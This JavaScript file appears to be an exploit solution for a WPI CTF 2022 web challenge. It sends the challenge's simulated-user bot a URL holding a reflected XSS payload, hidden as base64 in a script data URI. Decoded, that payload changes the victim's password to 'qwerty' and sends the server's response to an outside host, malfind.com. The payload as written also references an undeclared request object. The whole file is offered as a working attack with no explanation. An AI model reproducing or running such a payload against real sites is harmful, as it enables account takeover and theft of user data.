var xhr = new XMLHttpRequest();
var url = "http://muffin-hater.wpi-ctf-2022-codelab.kctf.cloud:8000/simulated-user";
var payload = "url="+encodeURIComponent('http://muffin-hater.wpi-ctf-2022-codelab.kctf.cloud:8080/search?query=<script src="data:text/javascript;base64,dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgdXJsID0gImh0dHA6Ly9tdWZmaW4taGF0ZXIud3BpLWN0Zi0yMDIyLWNvZGVsYWIua2N0Zi5jbG91ZDo4MDAwL2NoYW5nZS1wYXNzIjsKdmFyIHVybDIgPSAiaHR0cHM6Ly9tYWxmaW5kLmNvbS9leHBsb2l0PSIKeGhyLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgInRleHQvcGxhaW4iKTsKeGhyLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsKICAgIGlmICh4aHIucmVhZHlTdGF0ZSA9PT0gNCAmJiB4aHIuc3RhdHVzID09PSAyMDApIHsKICAgICAgICBleGYgPSBidG9hKHhoci5yZXNwb25zZVRleHQpOwogICAgICAgIHhocjIub3BlbigiR0VUIiwgdXJsMitleGYsIHRydWUpOwogICAgICAgIHhocjIuc2VuZCgpOwogICAgICAgIGNvbnNvbGUubG9nKHVybCtleGYpOwogICAgfQp9Owp2YXIgZGF0YSA9IEpTT04uc3RyaW5naWZ5KHsibmV3cGFzcyI6ICJxd2VydHkifSk7Cnhoci5zZW5kKGRhdGEpOw=="></script>');
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
        console.log(xhr.responseText);
    }
};
xhr.send(payload);